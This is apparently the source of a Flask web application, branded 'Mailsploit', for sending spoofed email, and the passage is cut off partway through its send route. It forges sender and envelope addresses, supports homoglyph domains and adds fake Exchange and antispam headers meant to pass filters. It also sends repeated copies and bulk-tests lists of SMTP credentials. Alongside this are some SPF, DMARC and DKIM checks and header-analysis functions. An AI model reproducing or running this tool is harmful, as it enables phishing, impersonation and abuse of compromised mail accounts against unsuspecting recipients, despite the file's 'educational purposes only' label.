#!/usr/bin/env python3
"""
Advanced Email Spoofing Web Application
This web application demonstrates advanced email spoofing techniques for educational purposes only.

Developed by tofuub
"""

from flask import Flask, render_template, request, jsonify, flash, redirect, url_for
import smtplib
import sys
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.utils import formataddr, formatdate, make_msgid
import os
import uuid
import socket
import random
import struct
import threading
import time
import concurrent.futures
import codecs
from datetime import datetime
from werkzeug.utils import secure_filename
import tempfile
import dns.resolver
import dns.exception
import re
import base64
import json
from datetime import datetime
import hashlib
import requests

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this in production

# Configuration
# Vercel's filesystem is read-only, only /tmp/ is writable
if os.environ.get('VERCEL'):
    UPLOAD_FOLDER = '/tmp'
else:
    UPLOAD_FOLDER = 'uploads'
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)

ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

class EmailSpoofer:
    def __init__(self, smtp_server, smtp_port, username, password, debug_level=0):
        """
        Initialize EmailSpoofer with SMTP connection details
        
        Args:
            smtp_server (str): SMTP server address
            smtp_port (int): SMTP server port 
            username (str): SMTP authentication username
            password (str): SMTP authentication password
            debug_level (int): SMTP debug level (0-2)
        """
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
        self.debug_level = debug_level
        
    def _punycode_domain(self, domain):
        try:
            return domain.encode('idna').decode('ascii')
        except Exception:
            return domain
    
    def _to_ascii_address(self, email_addr):
        try:
            if not email_addr or '@' not in email_addr:
                return email_addr
            local, domain = email_addr.split('@', 1)
            ascii_domain = self._punycode_domain(domain)
            return f'{local}@{ascii_domain}'
        except Exception:
            return email_addr
    
    def _to_ascii_list(self, addrs):
        if not addrs:
            return addrs
        if isinstance(addrs, str):
            return self._to_ascii_address(addrs)
        return [self._to_ascii_address(a) for a in addrs]
        
    def create_message(self, from_name, from_email, reply_to=None, 
                      to_email=None, cc=None, bcc=None, subject=None, 
                      message=None, html=True, attachments=None):
        """
        Create a message with spoofed headers
        
        Args:
            from_name (str): Display name for the spoofed sender
            from_email (str): Email address shown as the sender
            reply_to (str, optional): Reply-to email address
            to_email (str/list): Recipient email address or list of addresses
            cc (str/list, optional): CC email address or list of addresses
            bcc (str/list, optional): BCC email address or list of addresses
            subject (str, optional): Email subject
            message (str, optional): Email body content
            html (bool): If True, content is HTML; if False, plain text
            attachments (list, optional): List of file paths to attach
            
        Returns:
            MIMEMultipart: The email message object
        """
        # Create message container
        msg = MIMEMultipart('alternative')
        
        ascii_from_email = self._to_ascii_address(from_email) if from_email else from_email
        ascii_reply_to = self._to_ascii_address(reply_to) if reply_to else reply_to
        ascii_to_list = self._to_ascii_list(to_email) if to_email else None
        ascii_cc_list = self._to_ascii_list(cc) if cc else None
        msg_id_domain_source = ascii_from_email or self.username or 'localhost@localhost'
        msg_id_domain = msg_id_domain_source.split('@')[1] if '@' in msg_id_domain_source else 'localhost'
        msg['Message-ID'] = make_msgid(domain=self._punycode_domain(msg_id_domain))
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = subject or ''
        msg['From'] = formataddr((from_name, ascii_from_email if ascii_from_email else ''))
        
        # Handle recipients
        if ascii_to_list:
            if isinstance(ascii_to_list, list):
                msg['To'] = ', '.join(ascii_to_list)
            else:
                msg['To'] = ascii_to_list
                
        # Add CC if specified
        if ascii_cc_list:
            if isinstance(ascii_cc_list, list):
                msg['Cc'] = ', '.join(ascii_cc_list)
            else:
                msg['Cc'] = ascii_cc_list
                
        # Set Reply-To if specified
        if ascii_reply_to:
            msg['Reply-To'] = ascii_reply_to
            
        # Set content type based on html flag
        if message:
            if html:
                msg.attach(MIMEText(message, 'html'))
            else:
                msg.attach(MIMEText(message, 'plain'))
        
        # Add attachments if any
        if attachments:
            for attachment in attachments:
                if os.path.exists(attachment):
                    with open(attachment, 'rb') as f:
                        file_attachment = MIMEApplication(f.read())
                        
                    # Add header with filename
                    filename = os.path.basename(attachment)
                    file_attachment.add_header('Content-Disposition', 
                                             'attachment', 
                                             filename=filename)
                    msg.attach(file_attachment)
        
        return msg
    
    def add_custom_headers(self, msg, headers):
        """
        Add custom headers to email message
        
        Args:
            msg (MIMEMultipart): Email message object
            headers (dict): Dictionary of headers to add
            
        Returns:
            MIMEMultipart: Updated email message
        """
        for header, value in headers.items():
            msg[header] = value
            
        return msg
    
    def spoof_x_headers(self, msg, target_domain=None):
        """
        Add fake X-headers to make email look more legitimate
        
        Args:
            msg (MIMEMultipart): Email message object
            target_domain (str, optional): Domain to mimic
            
        Returns:
            MIMEMultipart: Updated email message
        """
        from_email = msg['From'].split('<')[1].split('>')[0]
        domain = target_domain or from_email.split('@')[1]
        
        # Add common X-headers seen in legitimate emails
        x_headers = {
            'X-Mailer': random.choice(['Outlook', 'Apple Mail', 'Gmail', 'Yahoo Mail']),
            'X-Originating-IP': f'[{socket.inet_ntoa(struct.pack("!L", random.randint(1, 0xffffffff)))}]',
            'X-Sender': from_email,
            'X-Priority': '3',
            'X-MSMail-Priority': 'Normal',
            'X-MimeOLE': f'Produced By Microsoft MimeOLE V6.{random.randint(0, 99)}.{random.randint(1000, 9999)}.{random.randint(0, 99)}',
            'X-Transport': f'{domain}.mail.protection.outlook.com',
            'X-Forefront-Antispam-Report': f'CIP:{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)};CTRY:US;LANG:en;',
            'X-MS-Exchange-Organization-SCL': '0',
            'X-MS-Exchange-Organization-PCL': '0',
            'X-MS-Exchange-Transport-CrossTenantHeadersStamped': domain,
            'X-Entity-ID': str(uuid.uuid4())
        }
        
        for header, value in x_headers.items():
            msg[header] = value
            
        return msg
    
    def send_email(self, msg, recipients, envelope_sender=None):
        """
        Send the email message
        
        Args:
            msg (MIMEMultipart): Email message object
            recipients (list/str): List of recipient email addresses or single address
            envelope_sender (str, optional): Custom MAIL FROM address for re-enveloping
            
        Returns:
            tuple: (success, error_message)
        """
        if isinstance(recipients, str):
            recipient_list = [recipients]
        else:
            recipient_list = recipients
            
        try:
            # Connect to SMTP server
            server = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=30)
            server.set_debuglevel(self.debug_level)
            
            server.ehlo()
            server.starttls()
            server.ehlo()
            
            # Login to SMTP server
            server.login(self.username, self.password)
            
            # Send email
            # Use custom envelope_sender if provided, otherwise fallback to login username
            from_addr = envelope_sender if envelope_sender and envelope_sender.strip() else self.username
            envelope_sender_ascii = self._to_ascii_address(from_addr)
            envelope_recipients = self._to_ascii_list(recipient_list)
            
            try:
                server.sendmail(envelope_sender_ascii, envelope_recipients, msg.as_string())
            except (smtplib.SMTPSenderRefused, smtplib.SMTPResponseException) as e:
                # Handle "envelope sender domain must exist" errors by falling back to authenticated user
                error_str = str(e)
                if any(x in error_str.lower() for x in ["domain must exist", "552", "5.7.1", "sender refused"]):
                    print(f"\033[93m[!] Envelope '{envelope_sender_ascii}' refused. Retrying without spoofing...\033[0m")
                    server.sendmail(self.username, envelope_recipients, msg.as_string())
                else:
                    raise
            
            server.quit()
            
            return (True, None)
            
        except Exception as e:
            error_msg = str(e)
            return (False, error_msg)
            
    def test_connection(self):
        """
        Test the SMTP connection
        
        Returns:
            tuple: (success, error_message)
        """
        try:
            # Connect to SMTP server
            server = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=10)
            server.ehlo()
            server.starttls()
            server.ehlo()
            
            # Login to SMTP server
            server.login(self.username, self.password)
            server.quit()
            
            return (True, None)
            
        except Exception as e:
            return (False, str(e))

    def validate_sending(self, test_recipient):
        """
        Validate if the SMTP server can actually send an email by sending a test message
        
        Args:
            test_recipient (str): Email address to send the test message to
            
        Returns:
            tuple: (success, error_message)
        """
        if not test_recipient:
            return self.test_connection()
            
        try:
            msg = self.create_message(
                from_name="Mailsploit Validator",
                from_email=self.username,
                to_email=test_recipient,
                subject="SMTP Validation Test",
                message="This is an automated test to validate SMTP sending capabilities for Mailsploit.",
                html=False
            )
            return self.send_email(msg, test_recipient)
        except Exception as e:
            return (False, str(e))

def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def load_smtp_servers(file_path):
    """
    Load SMTP server credentials from a file
    
    Args:
        file_path (str): Path to file containing SMTP credentials
        
    Returns:
        list: List of dictionaries containing SMTP credentials
    """
    servers = []
    
    try:
        # Try different encodings to handle various file formats
        encodings = ['utf-8', 'latin-1', 'cp1252', 'ascii']
        
        for encoding in encodings:
            try:
                with codecs.open(file_path, 'r', encoding=encoding) as f:
                    line_num = 0
                    for line in f:
                        line_num += 1
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                            
                        try:
                            parts = line.split('|')
                            if len(parts) >= 4:
                                servers.append({
                                    'server': parts[0].strip(),
                                    'port': int(parts[1].strip()),
                                    'username': parts[2].strip(),
                                    'password': parts[3].strip()
                                })
                        except Exception as e:
                            continue
                
                # If we've successfully read the file, break out of the loop
                break
            except UnicodeDecodeError:
                # If this encoding doesn't work, try the next one
                if encoding == encodings[-1]:  # Last encoding in the list
                    raise
                continue
                
    except Exception as e:
        pass
        
    return servers

def test_smtp_server(server_info, validate_send=False, test_recipient=None):
    """
    Test SMTP server connection
    
    Args:
        server_info (dict): Dictionary containing SMTP server credentials
        validate_send (bool): Whether to validate sending capability
        test_recipient (str, optional): Test recipient email address for validation
        
    Returns:
        tuple: (server_info, success, error_message)
    """
    try:
        spoofer = EmailSpoofer(
            server_info['server'],
            server_info['port'],
            server_info['username'],
            server_info['password']
        )
        
        if validate_send:
            success, error_msg = spoofer.validate_sending(test_recipient)
        else:
            success, error_msg = spoofer.test_connection()
        
        return (server_info, success, error_msg)
    except Exception as e:
        return (server_info, False, str(e))


TURBOSMTP_API_URL = 'https://api.turbo-smtp.com/api/v2/mail/send'

def send_via_turbosmtp(consumer_key, consumer_secret, payload):
    """
    Send an email via the TurboSMTP REST API.

    Args:
        consumer_key (str): TurboSMTP Consumer Key.
        consumer_secret (str): TurboSMTP Consumer Secret.
        payload (dict): JSON body conforming to the TurboSMTP /mail/send schema.

    Returns:
        tuple: (success: bool, message: str)
    """
    headers = {
        'consumerKey': consumer_key,
        'consumerSecret': consumer_secret,
        'Content-Type': 'application/json',
    }
    try:
        resp = requests.post(TURBOSMTP_API_URL, json=payload, headers=headers, timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            mid = data.get('mid', '')
            return (True, f"Email accepted by TurboSMTP (mid: {mid})")
        else:
            try:
                err_data = resp.json()
                errors = err_data.get('errors', [])
                msg = err_data.get('message', resp.text)
                if errors:
                    msg = msg + ': ' + '; '.join(errors)
            except Exception:
                msg = resp.text or f'HTTP {resp.status_code}'
            return (False, f"TurboSMTP API error {resp.status_code}: {msg}")
    except Exception as exc:
        return (False, str(exc))

# Common public DNS resolvers for reliable fallback
PUBLIC_DNS_RESOLVERS = ['8.8.8.8', '1.1.1.1', '8.8.4.4', '1.0.0.1']

def get_dns_resolver():
    """Create a DNS resolver with public fallbacks"""
    r = dns.resolver.Resolver()
    r.nameservers = PUBLIC_DNS_RESOLVERS
    r.timeout = 5
    r.lifetime = 10
    return r

def resolve_doh(domain, record_type='A'):
    """Generic DoH resolver to bypass local UDP 53 blocks"""
    type_map = {'A': 1, 'CNAME': 5, 'TXT': 16}
    type_code = type_map.get(record_type.upper(), 1)
    url = f"https://dns.google/resolve?name={domain}&type={type_code}"
    try:
        response = requests.get(url, timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get('Status') == 0 and 'Answer' in data:
                if type_code == 16:
                    return [ans['data'].strip('"') for ans in data['Answer'] if ans['type'] == 16]
                return [ans['data'] for ans in data['Answer'] if ans['type'] == type_code]
    except Exception:
        pass
    return []

def resolve_txt_doh(domain):
    """Legacy wrapper for TXT records"""
    return resolve_doh(domain, 'TXT')

def check_domain_spoofing(domain):
    """
    Check if a domain is vulnerable to email spoofing by analyzing SPF and DMARC records
    
    Args:
        domain (str): Domain name to check
        
    Returns:
        dict: Analysis results including SPF, DMARC, and vulnerability assessment
    """
    analysis = {
        'domain': domain,
        'spf': {'status': 'not_found', 'record': None, 'vulnerable': True},
        'dmarc': {
            'status': 'not_found',
            'record': None,
            'policy': None,
            'subdomain_policy': None,
            'vulnerable': True,
            'subdomain_vulnerable': True
        },
        'overall_status': 'vulnerable',
        'summary': '',
        'recommendations': []
    }
    
    resolver = get_dns_resolver()
    
    try:
        # Check SPF record via DoH
        spf_records = resolve_txt_doh(domain)
        for record_text in spf_records:
            if record_text.startswith('v=spf1'):
                analysis['spf']['status'] = 'present'
                analysis['spf']['record'] = record_text
                # Check for strict/moderate qualifiers
                if '-all' in record_text or '~all' in record_text:
                    analysis['spf']['vulnerable'] = False
                break
        
        # Check DMARC record (tree walk for subdomains) via DoH
        domain_parts = domain.split('.')
        dmarc_found = False
        
        for i in range(len(domain_parts) - 1):
            check_domain = '.'.join(domain_parts[i:])
            dmarc_records = resolve_txt_doh(f'_dmarc.{check_domain}')
            for record_text in dmarc_records:
                if record_text.startswith('v=DMARC1'):
                    analysis['dmarc']['status'] = 'present'
                    if not dmarc_found:
                        analysis['dmarc']['record'] = record_text + (f' (inherited from {check_domain})' if domain != check_domain else '')
                    dmarc_found = True

                    record_lower = record_text.lower()
                    
                    # Parse policies
                    p_policy = 'unknown'
                    if 'p=quarantine' in record_lower: p_policy = 'quarantine'
                    elif 'p=reject' in record_lower: p_policy = 'reject'
                    elif 'p=none' in record_lower: p_policy = 'none'

                    sp_policy = p_policy
                    if 'sp=quarantine' in record_lower: sp_policy = 'quarantine'
                    elif 'sp=reject' in record_lower: sp_policy = 'reject'
                    elif 'sp=none' in record_lower: sp_policy = 'none'

                    is_inherited = (domain != check_domain)
                    effective_policy = sp_policy if is_inherited else p_policy

                    analysis['dmarc']['policy'] = effective_policy
                    analysis['dmarc']['vulnerable'] = effective_policy not in ['quarantine', 'reject']
                    
                    analysis['dmarc']['subdomain_policy'] = sp_policy
                    analysis['dmarc']['subdomain_vulnerable'] = sp_policy not in ['quarantine', 'reject']
                    break
            
            if dmarc_found:
                break

        
        # Determine overall status
        if analysis['dmarc']['status'] != 'present':
            analysis['overall_status'] = 'vulnerable'
            analysis['summary'] = 'Domain lacks a DMARC record and is vulnerable to email spoofing.'
        elif analysis['spf']['status'] != 'present':
            analysis['overall_status'] = 'partially_secure'
            analysis['summary'] = 'Domain has a DMARC record but lacks an SPF record.'
        elif not analysis['dmarc']['vulnerable']:
            analysis['overall_status'] = 'secure'
            analysis['summary'] = 'Domain has proper SPF and DMARC records configured.'
        else:
            analysis['overall_status'] = 'vulnerable'
            analysis['summary'] = 'Domain has SPF but DMARC policy is none, making it vulnerable.'

        # If subdomains are spoofable, downgrade overall status to potentially spoofable
        if analysis['dmarc']['status'] == 'present' and analysis['dmarc'].get('subdomain_vulnerable'):
            analysis['overall_status'] = 'vulnerable' 
            # Ensure summary mentions subdomain risk
            extra_note = ' Subdomains may be spoofable due to DMARC subdomain policy (sp).' 
            if extra_note.strip() not in analysis['summary']:
                analysis['summary'] = (analysis['summary'] + extra_note).strip()
        
        # Generate comprehensive recommendations
        recommendations = []
        if analysis['spf']['status'] == 'not_found':
            recommendations.append('<strong>Missing SPF Record:</strong> Your domain does not have a Sender Policy Framework (SPF) record. You must create a TXT record for your domain (e.g., <code>v=spf1 include:_spf.yourprovider.com ~all</code>) to authorize specific mail servers to send on your behalf and prevent unauthorized spoofing.')
        if analysis['dmarc']['status'] == 'not_found':
            recommendations.append('<strong>Missing DMARC Record:</strong> Your domain lacks a Domain-based Message Authentication, Reporting, and Conformance (DMARC) record. Once SPF/DKIM are configured, add a TXT record at <code>_dmarc.yourdomain.com</code> (e.g., <code>v=DMARC1; p=quarantine; rua=mailto:reports@yourdomain.com;</code>) to instruct receivers on how to handle spoofed mail.')
        elif analysis['dmarc']['policy'] == 'none':
            recommendations.append('<strong>Insecure DMARC Policy:</strong> Your DMARC policy is currently set to <code>p=none</code>, which means spoofed emails will still be delivered but generate reports. To actively protect your domain and users, analyze your DMARC reports to ensure legitimate mail passes, then upgrade your policy to <code>p=quarantine</code> or <code>p=reject</code>.')
        
        # Subdomain-specific recommendation
        if analysis['dmarc'].get('subdomain_vulnerable'):
            recommendations.append('<strong>Insecure Subdomain Policy:</strong> Your DMARC subdomain policy (<code>sp=</code>) is either set to <code>none</code> or inheriting an insecure root policy. Even if your root domain is secure, attackers can spoof emails coming from non-existent subdomains (e.g., <code>security@billing.yourdomain.com</code>). Explicitly set <code>sp=quarantine</code> or <code>sp=reject</code> in your DMARC record to protect all subdomains.')
        
        if not recommendations:
            recommendations.append('Domain appears to be properly configured for email security.')
        
        analysis['recommendations'] = recommendations
        
    except Exception as e:
        analysis['summary'] = f'Error checking domain: {str(e)}'
        analysis['recommendations'] = ['Unable to check domain records due to an error.']
    
    return analysis

def check_dkim_records(domain, selectors=None):
    """
    Check DKIM records for a domain
    
    Args:
        domain (str): Domain name to check
        selectors (list, optional): List of DKIM selectors to check
        
    Returns:
        dict: DKIM analysis results
    """
    if selectors is None:
        # Common DKIM selectors
        selectors = ['default', 'google', 'k1', 'k2', 'mail', 'dkim', 's1', 's2', 
                    'selector1', 'selector2', 'dk', 'key1', 'key2']
    
    analysis = {
        'domain': domain,
        'selectors_found': [],
        'selectors_checked': len(selectors),
        'total_keys': 0,
        'valid_keys': 0,
        'summary': '',
        'recommendations': []
    }
    
    resolver = get_dns_resolver()
    try:
        for selector in selectors:
            dkim_domain = f"{selector}._domainkey.{domain}"
            try:
                dkim_records = resolver.resolve(dkim_domain, 'TXT')
                for record in dkim_records:
                    record_text = str(record).strip('"')
                    if 'k=' in record_text or 'p=' in record_text:
                        # Parse DKIM record
                        dkim_data = parse_dkim_record(record_text)
                        dkim_data['selector'] = selector
                        dkim_data['record'] = record_text
                        analysis['selectors_found'].append(dkim_data)
                        analysis['total_keys'] += 1
                        
                        if dkim_data.get('valid', False):
                            analysis['valid_keys'] += 1
                        break
            except dns.exception.DNSException:
                continue
        
        # Generate summary
        if analysis['selectors_found']:
            analysis['summary'] = f"Found {len(analysis['selectors_found'])} DKIM selector(s) with {analysis['valid_keys']} valid key(s)."
            if analysis['valid_keys'] > 0:
                analysis['recommendations'].append('DKIM is properly configured for email authentication.')
            if analysis['valid_keys'] < analysis['total_keys']:
                analysis['recommendations'].append('Some DKIM keys may be invalid or expired. Review key configuration.')
        else:
            analysis['summary'] = 'No DKIM records found. Email authentication may be limited.'
            analysis['recommendations'].append('Consider implementing DKIM for better email authentication.')
            
    except Exception as e:
        analysis['summary'] = f'Error checking DKIM records: {str(e)}'
        analysis['recommendations'] = ['Unable to check DKIM records due to an error.']
    
    return analysis

def parse_dkim_record(record_text):
    """Parse DKIM record into components"""
    dkim_data = {
        'version': None,
        'algorithm': None,
        'key_type': None,
        'public_key': None,
        'service_types': None,
        'flags': None,
        'notes': None,
        'valid': False
    }
    
    # Parse key-value pairs
    pairs = re.findall(r'([a-z]+)=([^;]+)', record_text.lower())
    
    for key, value in pairs:
        value = value.strip()
        if key == 'v':
            dkim_data['version'] = value
        elif key == 'k':
            dkim_data['key_type'] = value
        elif key == 'h':
            dkim_data['algorithm'] = value
        elif key == 'p':
            dkim_data['public_key'] = value
            # Basic validation - check if key is not empty and looks like base64
            if value and len(value) > 50:
                try:
                    base64.b64decode(value + '==')  # Add padding for validation
                    dkim_data['valid'] = True
                except:
                    pass
        elif key == 's':
            dkim_data['service_types'] = value
        elif key == 't':
            dkim_data['flags'] = value
        elif key == 'n':
            dkim_data['notes'] = value
    
    return dkim_data

def analyze_email_headers(headers_text):
    """
    Analyze email headers for authenticity and security
    
    Args:
        headers_text (str): Raw email headers
        
    Returns:
        dict: Header analysis results
    """
    analysis = {
        'spf_result': None,
        'dkim_result': None,
        'dmarc_result': None,
        'authentication_results': [],
        'received_chain': [],
        'suspicious_indicators': [],
        'security_score': 0,
        'summary': '',
        'recommendations': []
    }
    
    try:
        headers = parse_email_headers(headers_text)
        
        # Check authentication results
        auth_results = headers.get('authentication-results', [])
        if isinstance(auth_results, str):
            auth_results = [auth_results]
            
        for auth_result in auth_results:
            analysis['authentication_results'].append(auth_result)
            
            # Parse SPF results
            if 'spf=' in auth_result.lower():
                spf_match = re.search(r'spf=([a-z]+)', auth_result.lower())
                if spf_match:
                    analysis['spf_result'] = spf_match.group(1)
            
            # Parse DKIM results
            if 'dkim=' in auth_result.lower():
                dkim_match = re.search(r'dkim=([a-z]+)', auth_result.lower())
                if dkim_match:
                    analysis['dkim_result'] = dkim_match.group(1)
            
            # Parse DMARC results
            if 'dmarc=' in auth_result.lower():
                dmarc_match = re.search(r'dmarc=([a-z]+)', auth_result.lower())
                if dmarc_match:
                    analysis['dmarc_result'] = dmarc_match.group(1)
        
        # Analyze received headers for routing
        received_headers = headers.get('received', [])
        if isinstance(received_headers, str):
            received_headers = [received_headers]
            
        for received in received_headers:
            analysis['received_chain'].append(received.strip())
        
        # Check for suspicious indicators
        check_suspicious_headers(headers, analysis)
        
        # Calculate security score
        analysis['security_score'] = calculate_security_score(analysis)
        
        # Generate summary and recommendations
        generate_header_analysis_summary(analysis)
        
    except Exception as e:
        analysis['summary'] = f'Error analyzing headers: {str(e)}'
        analysis['recommendations'] = ['Unable to analyze email headers due to an error.']
    
    return analysis

def parse_email_headers(headers_text):
    """Parse raw email headers into dictionary"""
    headers = {}
    current_header = None
    current_value = []
    
    for line in headers_text.split('\n'):
        if line.startswith(' ') or line.startswith('\t'):
            # Continuation of previous header
            if current_header:
                current_value.append(line.strip())
        else:
            # Save previous header
            if current_header:
                header_name = current_header.lower()
                header_value = ' '.join(current_value)
                if header_name in headers:
                    if isinstance(headers[header_name], list):
                        headers[header_name].append(header_value)
                    else:
                        headers[header_name] = [headers[header_name], header_value]
                else:
                    headers[header_name] = header_value
            
            # Start new header
            if ':' in line:
                current_header, value = line.split(':', 1)
                current_header = current_header.strip()
                current_value = [value.strip()]
            else:
                current_header = None
                current_value = []
    
    # Save last header
    if current_header:
        header_name = current_header.lower()
        header_value = ' '.join(current_value)
        if header_name in headers:
            if isinstance(headers[header_name], list):
                headers[header_name].append(header_value)
            else:
                headers[header_name] = [headers[header_name], header_value]
        else:
            headers[header_name] = header_value
    
    return headers

def check_suspicious_headers(headers, analysis):
    """Check for suspicious header indicators"""
    suspicious_patterns = [
        ('x-originating-ip', 'Suspicious originating IP patterns'),
        ('x-mailer', 'Suspicious mailer identification'),
        ('message-id', 'Suspicious or missing Message-ID'),
        ('return-path', 'Mismatched return path'),
    ]
    
    for header_name, description in suspicious_patterns:
        if header_name in headers:
            header_value = headers[header_name]
            if isinstance(header_value, list):
                header_value = header_value[0]
            
            # Add specific checks here
            if header_name == 'message-id' and not header_value:
                analysis['suspicious_indicators'].append(f'{description}: Missing Message-ID')

def calculate_security_score(analysis):
    """Calculate security score based on authentication results"""
    score = 0
    
    if analysis['spf_result'] == 'pass':
        score += 30
    elif analysis['spf_result'] == 'fail':
        score -= 20
    
    if analysis['dkim_result'] == 'pass':
        score += 30
    elif analysis['dkim_result'] == 'fail':
        score -= 20
    
    if analysis['dmarc_result'] == 'pass':
        score += 40
    elif analysis['dmarc_result'] == 'fail':
        score -= 30
    
    # Penalize suspicious indicators
    score -= len(analysis['suspicious_indicators']) * 10
    
    return max(0, min(100, score))

def generate_header_analysis_summary(analysis):
    """Generate summary and recommendations for header analysis"""
    if analysis['security_score'] >= 80:
        analysis['summary'] = 'Email appears authentic with strong authentication.'
    elif analysis['security_score'] >= 60:
        analysis['summary'] = 'Email has moderate authentication but may have some concerns.'
    elif analysis['security_score'] >= 40:
        analysis['summary'] = 'Email has weak authentication and potential security issues.'
    else:
        analysis['summary'] = 'Email shows signs of potential spoofing or security issues.'
    
    # Add specific recommendations
    if not analysis['spf_result']:
        analysis['recommendations'].append('No SPF authentication result found.')
    elif analysis['spf_result'] == 'fail':
        analysis['recommendations'].append('SPF authentication failed - sender may be unauthorized.')
    
    if not analysis['dkim_result']:
        analysis['recommendations'].append('No DKIM authentication result found.')
    elif analysis['dkim_result'] == 'fail':
        analysis['recommendations'].append('DKIM signature verification failed.')
    
    if not analysis['dmarc_result']:
        analysis['recommendations'].append('No DMARC authentication result found.')
    elif analysis['dmarc_result'] == 'fail':
        analysis['recommendations'].append('DMARC policy check failed.')

def check_multiple_domains(domains_list):
    """
    Check multiple domains for spoofing vulnerability
    
    Args:
        domains_list (list): List of domain names
        
    Returns:
        dict: Results for all domains
    """
    results = {
        'domains': [],
        'total_checked': 0,
        'vulnerable_count': 0,
        'secure_count': 0,
        'partially_secure_count': 0,
        'summary': ''
    }
    
    try:
        for domain in domains_list:
            domain = domain.strip()
            if not domain:
                continue
                
            # Clean domain
            domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')
            if '/' in domain:
                domain = domain.split('/')[0]
            
            # Check domain
            domain_analysis = check_domain_spoofing(domain)
            results['domains'].append(domain_analysis)
            results['total_checked'] += 1
            
            # Count by status
            if domain_analysis['overall_status'] == 'vulnerable':
                results['vulnerable_count'] += 1
            elif domain_analysis['overall_status'] == 'secure':
                results['secure_count'] += 1
            elif domain_analysis['overall_status'] == 'partially_secure':
                results['partially_secure_count'] += 1
        
        # Generate summary
        results['summary'] = f"Checked {results['total_checked']} domains: {results['secure_count']} secure, {results['partially_secure_count']} potentially spoofable, {results['vulnerable_count']} vulnerable"
        
    except Exception as e:
        results['summary'] = f'Error checking domains: {str(e)}'
    
    return results

@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')

@app.route('/features')
def features():
    """Dedicated Features Landing Page"""
    return render_template('features.html')

def send_via_api(consumer_key, consumer_secret, payload):
    """Generic REST API email sender (rebranded)"""
    import requests
    url = "https://api.eu.turbo-smtp.com/api/v2/mail/send"
    headers = {
        "consumerKey": consumer_key,
        "consumerSecret": consumer_secret,
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=20)
        if response.status_code in [200, 201, 202]:
            return True, "Email sent successfully via API"
        else:
            try:
                err_data = response.json()
                err = err_data.get('message') or err_data.get('error') or response.text
            except Exception:
                err = response.text
            return False, f"API error {response.status_code}: {err}"
    except Exception as e:
        return False, f"API connection error: {str(e)}"

@app.route('/send_email', methods=['POST'])
def send_email():
    """Send email via API or SMTP depending on send_mode"""
    try:
        send_mode = request.form.get('send_mode', 'smtp').strip().lower()

        # Sender identity
        from_name = request.form.get('from_name', '').strip()
        from_email = request.form.get('from_email', '').strip()
        reply_to = request.form.get('reply_to', '').strip()
        envelope_sender = request.form.get('envelope_sender', '').strip()

        # Recipients
        to_email = request.form.get('to_email', '').strip()
        cc = request.form.get('cc', '').strip()
        bcc = request.form.get('bcc', '').strip()

        # Message
        subject = request.form.get('subject', '')
        message = request.form.get('message', '')
        html = request.form.get('html') == 'on'
        add_xheaders = request.form.get('add_xheaders') == 'on'

        # Send count
        try:
            send_count = int(request.form.get('send_count', '1'))
        except Exception:
            send_count = 1
        send_count = max(1, min(100, send_count))

        if not all([from_email, to_email]):
            return jsonify({'success': False, 'error': 'Missing From Email or To fields'})

        # ── API MODE ──────────────────────────────────────
        if send_mode == 'api':
            consumer_key = request.form.get('consumer_key', '').strip()
            consumer_secret = request.form.get('consumer_secret', '').strip()

            if not all([consumer_key, consumer_secret]):
                return jsonify({'success': False, 'error': 'Missing API Consumer Key or Consumer Secret'})

            # Handle IDN (homoglyphs) for the API by encoding the domain as Punycode
            if '@' in from_email:
                u, d = from_email.rsplit('@', 1)
                try:
                    from_email_encoded = f"{u}@{d.encode('idna').decode('ascii')}"
                except Exception:
                    from_email_encoded = from_email
            else:
                from_email_encoded = from_email

            from_header = f"{from_name} <{from_email_encoded}>" if from_name else from_email_encoded

            # Handle attachments — base64-encode for the API
            attachment_list = []
            saved_paths = []
            if 'attachments' in request.files:
                files = request.files.getlist('attachments')
                for file in files:
                    if file and file.filename and allowed_file(file.filename):
                        filename = secure_filename(file.filename)
                        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                        file.save(file_path)
                        saved_paths.append(file_path)
                        with open(file_path, 'rb') as f:
                            encoded = base64.b64encode(f.read()).decode('utf-8')
                        import mimetypes
                        mime_type = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
                        attachment_list.append({
                            'content': encoded,
                            'name': filename,
                            'type': mime_type,
                        })

            payload = {
                'from': from_header,
                'to': to_email,
                'subject': subject,
                'content': message, # Always provide a text version for deliverability
            }
            if html:
                payload['html_content'] = message
            
            if cc:
                payload['cc'] = cc
            if bcc:
                payload['bcc'] = bcc
            if reply_to:
                # Add Reply-To via custom_headers as it's not a top-level field in V2
                payload['custom_headers'] = [{'header': 'Reply-To', 'value': reply_to}]
            if attachment_list:
                payload['attachments'] = attachment_list

            send_success = 0
            last_error = None
            for _ in range(send_count):
                success, msg = send_via_api(consumer_key, consumer_secret, payload)
                if success:
                    send_success += 1
                else:
                    last_error = msg

            for path in saved_paths:
                try:
                    os.remove(path)
                except Exception:
                    pass

        # ── SMTP MODE ─────────────────────────────────────
        else:
            smtp_server = request.form.get('smtp_server', '').strip()
            smtp_port_str = request.form.get('smtp_port', '587').strip()
            username = request.form.get('username', '').strip()
            password = request.form.get('password', '').strip()

            try:
                smtp_port = int(smtp_port_str)
            except Exception:
                smtp_port = 587

            if not all([smtp_server, username, password]):
